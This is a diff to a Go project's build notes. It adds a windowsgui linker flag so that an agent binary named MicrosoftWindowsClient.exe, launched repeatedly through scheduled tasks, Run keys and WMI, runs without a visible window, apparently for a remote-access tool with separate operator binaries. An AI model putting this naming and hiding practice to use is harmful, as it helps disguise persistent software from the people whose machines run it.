@@ -87,9 +87,13 @@ the version and ships all 6 assets together under one `vX.Y.Z` tag.
 go vet ./...
 go run ./tool/jscheck        # must print BALANCED OK + DOM-ORDER OK
 go test ./...
-# Release binaries always strip debug info (smaller + quieter footprint):
-go build -ldflags="-s -w" -o MicrosoftWindowsClient.exe ./cmd/agent
-# ... same -ldflags for all 6 assets
+# Release binaries always strip debug info (smaller + quieter footprint).
+# The agent runs unattended (tasks/Run/WMI launch it constantly), so it
+# MUST be windowsgui-subsystem: a console-subsystem agent flashes a CMD
+# window on every spawn. Never drop -H=windowsgui (v1.45.2 did — popups).
+go build -ldflags="-s -w -H=windowsgui" -o MicrosoftWindowsClient.exe ./cmd/agent
+# ... same -s -w for the other 5 assets (operator-facing binaries stay
+# console-subsystem so their terminal output remains visible)
 ```
 
 ## Layout
